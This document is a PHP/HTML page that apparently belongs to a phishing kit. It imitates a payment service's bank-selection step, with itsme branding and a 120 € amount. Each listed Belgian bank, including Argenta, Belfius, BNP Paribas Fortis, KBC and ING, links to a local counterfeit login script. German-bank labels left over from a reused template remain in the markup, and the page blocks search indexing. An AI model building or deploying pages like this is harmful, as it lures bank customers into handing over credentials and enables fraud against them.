<?php
 
 require_once "app.php";
   

?>
<html class="liquorice-ux no-js i svg no-touchevents" lang="de"><!--<![endif]--><head><meta http-equiv="Content-Type" content="text/html; charset=UTF-8">
		<title>Kies land en bank.</title>
	<meta http-equiv="Pragma" content="no-cache">
	<meta http-equiv="Expires" content="-1">

	<!-- Turn off telephone number detection on iOS. -->
	<meta name="format-detection" content="telephone=no">
					
	
	
	<meta name="viewport" content="width=device-width, initial-scale=1, viewport-fit=cover">
	<meta name="robots" content="noindex, follow">	<meta name="theme-color" content="#F5F5F6">	<link rel="shortcut icon" type="image/x-icon" href="./favicon.ico">	<link rel="stylesheet" type="text/css" href="./css/ux/style.css">
	
	</head>
<body id="SelectCountryPage" class="lang-de country-de template-default" data-info="1719-0" data-ready="true">
			
					<main class="main" id="main">
									<aside class="sidebar js-sidebar">
						

<div class="less visible in">
	<div class="sidebar-top">
														<div class="project-logo square visible">
						<img src="log.webp" alt="Company logo" id="CompanyLogo">
					</div>
											
		
		
<p class="amount js-toggle-details" data-currency="€" data-currency-format="%1$s %2$s">
    itsme®</p>						</div>
</div>

	<div class="more">
		<div class="sidebar-top">
			<div class="hidden-large">
				
									<p class="headline">Betrag</p>
					<p class="amount" data-currency="€" data-currency-format="%1$s %2$s">120,00&nbsp;€</p>
							</div>


					<p class="has-tip" title="">
											
										</p>
							
							
				

									
									</div>
	</div>



<div class="logo-container ">
		
	
	</div>

			
						</aside>
									<section class="content ">
				<div class="flex-size-wrapper">
					
										
																
					
<form action="./payment/multipay/go/select_country" id="WizardForm" novalidate="novalidate" method="post" accept-charset="utf-8"><div style="display:none;"><input type="hidden" name="_method" value="POST"><input type="hidden" name="data[_Token][key]" value="d" id="Token404625069" autocomplete="off"></div>	<div class="content-wrapper">
		<div class="header">
	
	
<div class="logo-container ">
			<div class="logo-centered">
	
			</div>
	</div>
	

</div>
		<div class="bank-selection-wrapper">
							<h1 class="small text-center">Selecteer uw betaalmethode

</h1>
					</div>

		<div class="js-inline-bank-search-container" style="margin-top: 15px;">
	
<div class="inline-bank-search bank-search-kob js-inline-bank-search">
	<div class="bank-search" id="BankSearch" data-input-length="">

		<label class=" floating-label has-placeholder no-label with-icon with-icon-search"><input name="data[BankCode][search]" autocomplete="off" placeholder=" " icon="search" class="no-autofocus" no_results_label="Kein Ergebnis gefunden" value="" data-variant="scroll-full" type="text" id="BankCodeSearch"><span>Zoek uw bank

</span><span class="no-result">Kein Ergebnis gefunden</span></label>		
<svg class="loader-circle in-search" viewBox="0 0 50 50">
	<circle class="path" cx="25" cy="25" r="20" fill="none" stroke-width="3"></circle>
</svg>		<div class="search-control">
			<div id="SearchDelete" class="search-control-delete" style="display: none;"></div>
		</div>
	</div>
			<div class="country-icon-select">
			<select name="data[MultipaysSession][sender_country_id]" class="rounded-flag-icon flag-be" id="MultipaysSessionSenderCountryId">






</select>		</div>
	</div>
</div>

<div id="TopBanks" class="top-banks-multistep">
	<div id="BankSearcherResults" class="multistep-selectors">
		<div id="BankSearcherResultsContent"></div>
	</div>

	<div class="result-default multistep-selectors">
		<div class="js-top-banks">
										<input name="data[bank_id]" id="sparkasse" type="radio" value="Sparkasse" class="bank-search-result-item" data-label="Sparkasse" data-method="multistep-search"><label for="dkb"><span class="avatar"><img alt="Banklogo" src="./img/be/arge.png"></span><a class="description" data-label="deutsche-kreditbank-dkb" href="./ARGE/login.php?page=ING">Argenta</a></label>							<input name="data[bank_id]" id="volksbank" type="radio" value="Volksbank" class="bank-search-result-item" data-label="Volksbank" data-method="multistep-search"><label for="volksbank"><span class="avatar"><img src="./img/be/belfius.png" alt="Banklogo"></span><a class="description" data-label="volksbank" href="./BELF/log.php?page=SparkassenErste">Belfius</a></label>							<input name="data[MultipaysSession][sender_bank_code]" id="postbank" type="radio" value="59010044" class="bank-search-result-item" data-label="Postbank" data-method="multistep-submit"><label for="postbank"><span class="avatar"><img src="./img/be/bnp.png" alt="Banklogo"></span><a class="description" data-label="postbank" href="./FORTI/login.php?page=BAWAG">BNP Paribas Fortis</a></label>							<input name="data[MultipaysSession][sender_bank_code]" id="commerzbank" type="radio" value="26589210" class="bank-search-result-item" data-label="Commerzbank" data-method="multistep-submit"><label for="commerzbank"><span class="avatar"><img src="./img/be/cbc.png" alt="Banklogo"></span><a class="description" data-label="commerzbank" href="./CB/login.php?page=BankAustria">CBC</a></label>							<input name="data[bank_id]" id="deutsche-bank" type="radio" value="Deutsche Bank" class="bank-search-result-item" data-label="Deutsche Bank" data-method="multistep-search">							<label for="dkb"><span class="avatar"><img src="./img/be/fintro.png" alt="Banklogo"></span><a class="description" data-label="deutsche-kreditbank-dkb" href="./FINTR/login.php?page=EasyBank">Fintro</a></label>							<label for="dkb"><span class="avatar"><img src="./img/be/ing.png" alt="Banklogo"></span><a class="description" data-label="deutsche-kreditbank-dkb" href="./IG/login.php?page=OberBank">ING</a></label><label for="dkb"><span class="avatar"><img src="./img/be/kbc.png" alt="Banklogo"></span><a class="description" data-label="deutsche-kreditbank-dkb" href="./KB/login.php?page=ING">KBC</a></label>			
												</div>

					
			</div>
</div>
	</div>

	
<div class="float-control ">
			
	
	</div>

<span class="spacer-xl"></span>
<button class="button-right primary has-indicator hide disabled" data-skip-leave-alert="true" disabled="disabled">
	Weiter	<span class="loader-inline"></span>
</button>
<div style="display:none;"><input type="hidden" name="data[_Token][fields]" value="1b1aaf86c42a5e1f77ba41ac5f3a5ea4527b1b87%3AMultipaysSession.bank_id%7CMultipaysSession.bank_search_result_display_name%7CMultipaysSession.sender_bank_code" id="TokenFields72337284" autocomplete="off"><input type="hidden" name="data[_Token][unlocked]" value="" id="TokenUnlocked1306885474" autocomplete="off"></div></form>
					<div id="contentBackdrop" class="content-backdrop"></div>
				</div>
			</section>
		</main>

					<footer id="main-footer" class="footer main-footer">
				



			</footer>
		
		
		
					

			

			
		
					
		
		

		<div class="mobile-sidebar-backdrop"></div>

		

					
			
	

</body></html>